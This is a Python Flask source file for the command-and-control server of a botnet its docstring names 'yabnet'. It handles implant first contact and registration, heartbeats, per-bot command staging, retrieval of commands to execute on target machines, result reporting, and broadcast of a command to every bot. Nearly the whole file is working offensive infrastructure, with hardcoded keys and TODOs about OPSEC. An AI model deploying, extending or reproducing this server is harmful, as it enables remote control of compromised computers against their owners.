from flask import Flask, url_for, request, redirect, jsonify, render_template, session 
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime  

from models import Bot
from models import Command
from models import db 

"""
Name: server.py 
Description: Python Flask Backend for the botnet. Takes care of the bot/command database and the API related with it. 
Also takes are of master console's request/response. 

TODO: Add "lastcheckin" in Bot. Upon master's "list" command, 
go through all the Bots and remove all the bots which did not checkin
for 5 cycles 
TODO2: Actually make a working server 

"""

app = Flask(__name__)
app.config['DEBUG'] = True
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///yabnet.sqlite3'
db.app = app
db.init_app(app)

FIRSTCONTACTKEY = 'firstcontactkey'
# TODO: Change the register key to change dynamically 
REGISTERKEY = 'registerkey'
MASTERKEY = 'masterkey'


def init_db():
    db.drop_all()
    db.create_all()
    db.session.commit()

@app.route('/')
def hello_world():
    return "Hello, world!"

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    """
    Description: Endpoint which takes report of bots' heartbeat. Will check
    if the bot is still alive, and update the timestamp of the bot as well. 
    """
    if request.method != 'POST':
        return jsonify({'error': 'wrong HTTP method'})

    data = request.form

    ip = data['ip']
    user = data['user']

    print("[DEBUG] user = ", user)

    # See if the bot exists, and if it does, update/refresh the timestamp of the bot.
    query_bot = Bot.query.filter_by(ip=ip).filter_by(user=user).first()
    query_bot.set_timestamp(datetime.now())

    return 'heartbeat'

@app.route('/firstcontact', methods=['POST'])
def firstcontact(): 
    """
    Description: Endpoint which retrieves first contact from the bot. 
    
    [POST] 
        - (str) firstcontactkey : firstcontact key to identify if the 
        contact is coming from the implant or not 
    """

    if request.method != 'POST':
        return jsonify({'error': 'wrong HTTP method'})

    data = request.form

    print("[DEBUG] firstcontact data = ", data)

    try:
        # Error checking 
        if data is None:
            return jsonify({'result': 'firstcontactkey is required'})
        elif data['firstcontactkey'] is None:
            return jsonify({'result': 'wrong'})
        elif data['firstcontactkey'] != FIRSTCONTACTKEY:
            return jsonify({'result': 'wrong firstcontactkey'})
        
        # Successful first contact. Return register key 
        # TODO: Implement random register key for each bot? 
        elif data['firstcontactkey'] == FIRSTCONTACTKEY:
            return jsonify({'result': 'success', 'registerkey': 'registerkey'})

    except Exception as e:
        return ''

@app.route('/register', methods=['POST'])
def register():
    """
    Description: Register a new bot to the server 

    [POST] 
        - registerkey = Register key that is needed for the registration process. 
        The key could be obtained through the firstcontact. 

        - ip = IP address of the bot 
        - os = OS type (Nix/Windows) of the bot 
    """
    if request.method != 'POST':
        return jsonify({'error': 'wrong HTTP method'})

    data = request.form
    registerkey = data['registerkey']
    bot_ip = data['ip']
    bot_os = data['os']
    bot_user = data['user']

    print("[DEBUG] firstcontact data = ", data)

    # Error checking for post request and data parameters 
    try:
        if data is None:
            return jsonify({'error': 'Could not process body parameters'})
        if registerkey is None:
            return jsonify({'error': 'regsiterkey is required'})
        if bot_ip is None:
            return jsonify({'error': 'ip is required'})
        if bot_os is None:
            return jsonify({'error': 'os is required'})
   
        # Check if bot already exists in the database      
        try:
            query_bot = Bot.query.filter_by(ip=bot_ip).filter_by(user=bot_user).first()
        except Exception as e:
            print("[!]", e)

        if query_bot is not None:
            return jsonify({'error': 'Bot already registered'})

        # Register a new bot, and add it to the database 
        else:
            print("[+] Added a new bot !")
            bot = Bot(bot_ip, bot_os, bot_user)
            db.session.add(bot)
            db.session.commit()

            return jsonify({'result': 'Bot was added'})

    except Exception as e:
        return '' 

@app.route('/bot/<bot_ip>/push', methods=['POST'])
def botpush(bot_ip):
    """
    TODO: This + cmd Model + Master key to reach this API endpoint 
    Description: Pushes the command into the cmd Model. Remember to create cmd Model for the database!

    [POST]
        - masterkey = Master's secret key 
        - cmd = Command to push to the bot 

    """

    if request.method != 'POST':
        return jsonify({'error': 'wrong HTTP method'})

    data = request.form
    masterkey = data['masterkey']
    cmd = data['cmd']

    try:
        if data is None:
            return jsonify({'error': 'Could not process body parameters'})
        if masterkey is None:
            return jsonify({'error': 'masterkey is required'})
        if cmd is None:
            return jsonify({'error': 'cmd is required'})

        # Query and get the bot which has the bot_ip, and then append the command to it 
        query_bot = Bot.query.filter_by(ip=bot_ip).first()
        cmd = Command(cmd, query_bot.id, bot_ip)

        # Actually push the command to the bot. If there is a previous command queued (making len(query_bot.cmds) >=1 ), ignore.
        if len(query_bot.cmds) < 1:
            try:
                query_bot.cmds.append(cmd)
                db.session.add(cmd)
                db.session.commit()

                print("[DEBUG] Command staged")

                return jsonify({'result': 'Command staged'})

            except Exception as e:
                return jsonify({'error': 'Error occurred while staging command'})
        else:
            return jsonify({'error': 'Only one command can be staged'})

    except Exception as e:
        return jsonify({ 'error': '[-] Bot does not exist. ' + str(e) }) 

@app.route('/bot/<bot_ip>/task', methods=['POST'])
def bottask(bot_ip):
    """
    Description: Shows the command that is staged for the corresponding bot. 
    The bot will visit this endpoint, retrieve the command, and execute it in the 
    target machine 

    [POST]
        - regsiterkey = "Authentication" key for the bot  
    """

    if request.method != 'POST':
        return jsonify({'error': 'wrong HTTP method'})

    data = request.form
    registerkey = data['registerkey']

    try:
        if data is None:
            return jsonify({'error': 'Could not process body parameters'})
        if registerkey is None:
            return jsonify({'error': 'regsiterkey is required'})

        # Get the bot corresponding with the bot_ip 
        query_bot = Bot.query.filter_by(ip=bot_ip).first()

        # Try getting commands, from the oldest staged command to the lastest staged command. 
        try:
            command = query_bot.cmds[0]
        except Exception as e:
            return jsonify({'error': 'There are no commands available'})

        return jsonify({ 'command': command.cmd })


    except Exception as e:
        return jsonify({ 'error': str(e) }) 

@app.route('/bot/<bot_ip>/result', methods=['POST'])
def botresult(bot_ip):
    """
    Description: API endpoint which the bot comes and reports the result of the staged command. 
    If a bot visits, the endpoint will update the result of the Command Model of the corresponding bot. 

    If a master visits, the endpoint will show the result.

    [POST]
        - key = Either bot_unique_key or masterkey. Endpoint's behavior changes correspondingly 
        - result = 
    """

    if request.method != 'POST':
        return jsonify({'error': 'wrong HTTP method'})

    data = request.form
    if data is None:
        return jsonify({'error': 'body cannot be empty'})

    try:
        # If a bot is visiting the endpoint, submit the result into the database 
        if 'registerkey' in data:
            if data['registerkey'] == REGISTERKEY:
                result = data['result']

                query_bot = Bot.query.filter_by(ip=bot_ip).first()
                command = Command.query.filter_by(bot_id=query_bot.id).order_by(Command.id.desc()).first()
                command.set_result(result)
                query_bot.cmds.remove(command)
                db.session.commit()
                
                # This needs to be changed 
                return '' 

        # If a master is visiting the endpoint, return the result to the master 
        elif 'masterkey' in data:
            try:
                query_bot = Bot.query.filter_by(ip=bot_ip).first()
                command = Command.query.filter_by(bot_ip=bot_ip).order_by(Command.id.desc()).first()
                result = command.result

                if result is None:
                    return jsonify({'error': 'Bot have not called back'})
                else:
                    return result 

            except Exception as e:
                return jsonify({ 'error': str(e) })

        else:
            return jsonify({'error': 'reigsterkey/masterkey cannot be empty'})

    except Exception as e:
        return jsonify({ 'error': str(e) })
    

# TODO: Change to POST, implement master authentication for OPSEC 
# TODO: Change the result to json, as an API endpoint 
@app.route('/bot/list', methods=['GET'])
def botlist():
    """
    Description: View and return all the bots in the server database
    TODO: Implement returning bot objects in json format 
    """

    botlist = Bot.query.all()

    # Refresh bot list. Remove bot if it hasn't come back for TIMER*5 
    for bot in botlist:
        if (datetime.now() - bot.timestamp).total_seconds() > 30:
            db.session.delete(bot)
        db.session.commit()


    result = '' 

    # Show bot list 
    for bot in botlist:
        result += bot.get_info() + '\n'

    return result

@app.route('/bot/commands', methods=['GET'])
def commandlist():
    commandlist = Command.query.all()

    result = ''

    for command in commandlist:
        result += command.get_info()
        #print (command.get_info())

    return result 


@app.route('/bot/broadcast', methods=['POST'])
def broadcast():
    """
    Description: Push the command into all the bots in the database 

    [POST]
        - masterkey = Masterkey to validate and authenticate master
        - command = Actual command to be pushed to the entire bots 
    """

    if request.method != 'POST':
        return jsonify({'error': 'wrong HTTP method'})

    data = request.form

    masterkey = data['masterkey']
    command = data['cmd']

    if data is None:
        return jsonify({'error': 'body cannot be empty'})
    elif masterkey != MASTERKEY:
        return jsonify({'error': 'you are not master'})
    elif command is None:
        return jsonify({'error': 'command cannot be null'})

    bots = Bot.query.all()

    for bot in bots:
        cmd = Command(command, bot.id, bot.ip)
        bot.cmds.append(cmd)
        db.session.add(cmd)
    db.session.commit()



init_db()

if __name__ == '__main__':
    app.run()